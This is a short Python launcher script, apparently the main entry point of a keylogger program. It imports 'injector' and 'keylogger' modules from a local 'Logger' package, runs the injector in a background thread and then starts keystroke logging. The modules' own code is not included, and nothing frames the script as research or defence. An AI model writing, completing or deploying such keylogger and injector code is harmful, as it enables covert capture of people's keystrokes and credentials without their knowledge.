from Logger import injector, keylogger
import threading

injector_thread = threading.Thread(target=injector.start)
injector_thread.start()

keylogger.start()